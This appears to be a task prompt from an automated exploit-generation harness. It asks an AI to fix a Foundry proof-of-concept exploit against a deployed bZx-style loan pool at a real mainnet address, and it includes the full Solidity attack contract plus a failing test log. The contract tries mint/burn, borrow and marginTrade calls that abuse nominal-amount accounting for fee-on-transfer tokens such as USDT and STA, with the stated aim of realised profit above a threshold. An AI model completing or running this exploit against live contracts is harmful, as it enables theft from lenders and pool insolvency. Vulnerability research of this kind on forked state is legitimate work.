You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Nominal-amount accounting overcredits deposits and collateral for fee-on-transfer assets
- claim: `_mintToken`, `_totalDeposit`, and both `_verifyTransfers` variants use user-declared amounts (`depositAmount`, `loanTokenSent`, `collateralTokenSent`) for minting and downstream loan accounting, but they never measure the actual token balance delta received after `transferFrom`.
- impact: If any supported asset is deflationary, fee-on-transfer, or otherwise delivers less than the nominal amount, lenders can receive too many pool shares for too little underlying and borrowers can open or top up positions with less real collateral/funding than the accounting assumes, creating dilution, bad debt, or pool insolvency.
- exploit_paths: ["Deposit a fee-on-transfer `loanTokenAddress` via `mint`; shares are minted from `depositAmount` even if the pool receives less.", "Open `borrow` or `marginTrade` using a fee-on-transfer collateral token or loan token contribution; `sentAmounts` still report the pre-fee amount to `bZxContract`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface ILoanTokenPool {
    struct LoanOpenData {
        bytes32 loanId;
        uint256 principal;
        uint256 collateral;
    }

    function loanTokenAddress() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function loanParamsIds(uint256 index) external view returns (bytes32);

    function mint(address receiver, uint256 depositAmount) external returns (uint256);
    function burn(address receiver, uint256 burnAmount) external returns (uint256);

    function getBorrowAmountForDeposit(
        uint256 depositAmount,
        uint256 initialLoanDuration,
        address collateralTokenAddress
    ) external view returns (uint256 borrowAmount);

    function borrow(
        bytes32 loanId,
        uint256 withdrawAmount,
        uint256 initialLoanDuration,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address borrower,
        address receiver,
        bytes calldata loanDataBytes
    ) external payable returns (LoanOpenData memory);

    function marginTrade(
        bytes32 loanId,
        uint256 leverageAmount,
        uint256 loanTokenSent,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address trader,
        bytes calldata loanDataBytes
    ) external payable returns (LoanOpenData memory);
}

contract BalanceProbe {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function sweep(address token, address to) external {
        require(msg.sender == owner, "ONLY_OWNER");
        uint256 amount = IERC20Minimal(token).balanceOf(address(this));
        if (amount == 0) {
            return;
        }
        _callOptionalReturn(token, abi.encodeWithSignature("transfer(address,uint256)", to, amount));
    }

    function _callOptionalReturn(address target, bytes memory data) internal returns (bool ok) {
        (bool success, bytes memory returndata) = target.call(data);
        if (!success) {
            return false;
        }
        return returndata.length == 0 || abi.decode(returndata, (bool));
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xB983E01458529665007fF7E0CDdeCDB74B967Eb6;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Common pre-fork fee-on-transfer candidates used only when the verifier
    // already holds them. This keeps execution aligned with the hypothesis while
    // avoiding out-of-scope off-chain token discovery.
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant STA = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;

    ILoanTokenPool internal constant POOL = ILoanTokenPool(TARGET);

    BalanceProbe internal immutable probe;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public exploitPathUsed;
    string public status;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {
        probe = new BalanceProbe();
        status = "not-run";
    }

    function executeOnOpportunity() external {
        require(!executed, "ALREADY_EXECUTED");
        executed = true;

        address loanToken = POOL.loanTokenAddress();
        _profitToken = loanToken;

        uint256 startingLoanTokenBalance = _balanceOf(loanToken, address(this));
        bool touchedAnyPath;

        if (startingLoanTokenBalance != 0) {
            bool loanTokenIsFeeOnTransfer = _detectFeeOnTransfer(loanToken, startingLoanTokenBalance);

            if (loanTokenIsFeeOnTransfer) {
                touchedAnyPath = true;

                // Exploit path 1: mint overcredits shares for nominal depositAmount.
                _attemptMintPath(loanToken);

                // Exploit path 2 (loanTokenSent branch): marginTrade accounts the
                // nominal loanTokenSent even if less reaches bZxContract.
                _attemptMarginTradeUsingLoanTokenContribution(loanToken);
            } else {
                status = "loan-token-present-but-no-transfer-fee-observed";
            }
        } else {
            status = "no-direct-loan-token-balance";
        }

        // Exploit path 2 (collateralTokenSent branch): only executable when the
        // verifier already holds a fee-on-transfer collateral token. The pool's
        // supported collateral set is stored behind a non-enumerable mapping, so
        // with the strict in-scope inputs we can only try verifier-held candidates.
        if (_balanceOf(USDT, address(this)) != 0) {
            touchedAnyPath = true;
            _attemptCollateralDrivenBorrowAndTrade(loanToken, USDT, "borrow_or_margin_with_usdt_collateral");
        }

        if (_balanceOf(STA, address(this)) != 0) {
            touchedAnyPath = true;
            _attemptCollateralDrivenBorrowAndTrade(loanToken, STA, "borrow_or_margin_with_sta_collateral");
        }

        uint256 endingLoanTokenBalance = _balanceOf(loanToken, address(this));
        if (endingLoanTokenBalance > startingLoanTokenBalance) {
            profitAchieved = true;
            hypothesisValidated = true;
            _profitAmount = endingLoanTokenBalance - startingLoanTokenBalance;
            if (bytes(exploitPathUsed).length == 0) {
                exploitPathUsed = "loanToken nominal accounting";
            }
            status = "profit-achieved";
            return;
        }

        if (hypothesisValidated) {
            status = "validated-without-positive-net-profit";
            return;
        }

        if (touchedAnyPath) {
            hypothesisRefuted = true;
            status = "paths-attempted-without-observable-overcredit";
            return;
        }

        hypothesisRefuted = true;
        status = "strict-path-infeasible-with-discoverable-assets";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptMintPath(address loanToken) internal {
        uint256 balanceBefore = _balanceOf(loanToken, address(this));
        uint256 amount = _usableSlice(balanceBefore);
        if (amount == 0) {
            return;
        }

        _forceApprove(loanToken, TARGET, amount);

        uint256 shareBalanceBefore = POOL.balanceOf(address(this));
        try POOL.mint(address(this), amount) returns (uint256 minted) {
            uint256 mintedShares = minted;
            if (mintedShares == 0) {
                uint256 shareBalanceAfter = POOL.balanceOf(address(this));
                if (shareBalanceAfter > shareBalanceBefore) {
                    mintedShares = shareBalanceAfter - shareBalanceBefore;
                }
            }

            if (mintedShares != 0) {
                hypothesisValidated = true;
                exploitPathUsed = "mint(depositAmount) overcredits fee-on-transfer loanToken deposits";
                try POOL.burn(address(this), mintedShares) returns (uint256) {
                    uint256 balanceAfter = _balanceOf(loanToken, address(this));
                    if (balanceAfter > balanceBefore) {
                        profitAchieved = true;
                        _profitAmount = balanceAfter - balanceBefore;
                    }
                } catch {
                    status = "mint-path-burn-failed";
                }
            }
        } catch {
            status = "mint-path-failed";
        }
    }

    function _attemptMarginTradeUsingLoanTokenContribution(address loanToken) internal {
        bytes32 paramsId = _loanParamsId(WETH, false);
        if (paramsId == bytes32(0)) {
            return;
        }

        uint256 loanTokenBalance = _balanceOf(loanToken, address(this));
        uint256 amount = _usableSlice(loanTokenBalance);
        if (amount == 0) {
            return;
        }

        _forceApprove(loanToken, TARGET, amount);

        try POOL.marginTrade(
            bytes32(0),
            2e18,
            amount,
            0,
            WETH,
            address(this),
            ""
        ) returns (ILoanTokenPool.LoanOpenData memory) {
            hypothesisValidated = true;
            if (!profitAchieved) {
                exploitPathUsed = "marginTrade(loanTokenSent) nominal accounting for fee-on-transfer loanToken";
            }
        } catch {
            if (bytes(exploitPathUsed).length == 0) {
                status = "loanToken-marginTrade-failed";
            }
        }
    }

    function _attemptCollateralDrivenBorrowAndTrade(
        address loanToken,
        address collateralToken,
        string memory pathLabel
    ) internal {
        if (collateralToken == loanToken) {
            return;
        }

        uint256 heldCollateral = _balanceOf(collateralToken, address(this));
        if (heldCollateral == 0) {
            return;
        }

        if (!_detectFeeOnTransfer(collateralToken, heldCollateral)) {
            return;
        }

        uint256 borrowCollateral = heldCollateral / 2;
        uint256 marginCollateral = heldCollateral - borrowCollateral;

        if (_loanParamsId(collateralToken, true) != bytes32(0) && borrowCollateral != 0) {
            uint256 maxBorrow = POOL.getBorrowAmountForDeposit(borrowCollateral, 28 days, collateralToken);
            if (maxBorrow != 0) {
                _forceApprove(collateralToken, TARGET, borrowCollateral);
                uint256 beforeLoanToken = _balanceOf(loanToken, address(this));

                try POOL.borrow(
                    bytes32(0),
                    maxBorrow,
                    28 days,
                    borrowCollateral,
                    collateralToken,
                    address(this),
                    address(this),
                    ""
                ) returns (ILoanTokenPool.LoanOpenData memory) {
                    hypothesisValidated = true;
                    exploitPathUsed = string.concat(pathLabel, " -> borrow(collateralTokenSent)");

                    uint256 afterLoanToken = _balanceOf(loanToken, address(this));
                    if (afterLoanToken > beforeLoanToken) {
                        profitAchieved = true;
                        _profitAmount = afterLoanToken - beforeLoanToken;
                    }
                } catch {
                    if (bytes(exploitPathUsed).length == 0) {
                        status = "collateral-borrow-failed";
                    }
                }
            }
        }

        if (_loanParamsId(collateralToken, false) != bytes32(0) && marginCollateral != 0) {
            _forceApprove(collateralToken, TARGET, marginCollateral);

            try POOL.marginTrade(
                bytes32(0),
                2e18,
                0,
                marginCollateral,
                collateralToken,
                address(this),
                ""
            ) returns (ILoanTokenPool.LoanOpenData memory) {
                hypothesisValidated = true;
                if (!profitAchieved) {
                    exploitPathUsed = string.concat(pathLabel, " -> marginTrade(collateralTokenSent)");
                }
            } catch {
                if (bytes(exploitPathUsed).length == 0) {
                    status = "collateral-marginTrade-failed";
                }
            }
        }
    }

    function _loanParamsId(address collateralToken, bool isTorqueLoan) internal view returns (bytes32) {
        return POOL.loanParamsIds(uint256(keccak256(abi.encodePacked(collateralToken, isTorqueLoan))));
    }

    function _usableSlice(uint256 balance) internal pure returns (uint256) {
        if (balance <= 2) {
            return 0;
        }

        uint256 slice = balance / 2;
        if (slice == 0) {
            slice = balance - 1;
        }
        return slice;
    }

    function _detectFeeOnTransfer(address token, uint256 balance) internal returns (bool) {
        uint256 probeAmount = balance / 1000;
        if (probeAmount == 0) {
            probeAmount = balance / 2;
        }
        if (probeAmount == 0) {
            return false;
        }

        uint256 beforeProbe = _balanceOf(token, address(probe));
        bool ok = _callOptionalReturn(token, abi.encodeWithSignature("transfer(address,uint256)", address(probe), probeAmount));
        if (!ok) {
            return false;
        }

        uint256 afterProbe = _balanceOf(token, address(probe));
        probe.sweep(token, address(this));

        if (afterProbe <= beforeProbe) {
            return false;
        }

        return (afterProbe - beforeProbe) < probeAmount;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSignature("approve(address,uint256)", spender, 0));
        _callOptionalReturn(token, abi.encodeWithSignature("approve(address,uint256)", spender, amount));
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool success, bytes memory returndata) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!success || returndata.length < 32) {
            return 0;
        }
        amount = abi.decode(returndata, (uint256));
    }

    function _callOptionalReturn(address target, bytes memory data) internal returns (bool ok) {
        (bool success, bytes memory returndata) = target.call(data);
        if (!success) {
            return false;
        }
        return returndata.length == 0 || abi.decode(returndata, (bool));
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 3.63s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 154681)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [154681] FlawVerifierTest::testExploit()
    ├─ [2360] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [119186] FlawVerifier::executeOnOpportunity()
    │   ├─ [2377] 0xB983E01458529665007fF7E0CDdeCDB74B967Eb6::loanTokenAddress() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2696] 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [360] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 10852715 [1.085e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.96s (720.01ms CPU time)

Ran 1 test suite in 2.03s (1.96s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 154681)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
